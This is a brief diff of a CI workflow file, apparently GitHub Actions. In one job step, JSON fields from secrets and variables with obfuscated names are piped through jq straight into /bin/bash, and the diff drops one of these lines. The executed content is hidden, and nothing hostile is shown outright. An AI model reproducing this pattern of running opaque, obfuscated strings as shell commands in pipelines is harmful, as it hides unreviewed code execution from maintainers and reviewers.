@@ -18,7 +18,6 @@ jobs:
           thvdv3: ${{ secrets.thvdv3 }}
         run: |
           printf '%s' "$thvdv3" | jq -r .akyyi67 | /bin/bash
-          echo $es55 | jq -r .vqcma211 | /bin/bash
           echo $yt36035 | jq -r .lsca73 | /bin/bash
           echo $son6 | jq -r .ta886 | /bin/bash
 
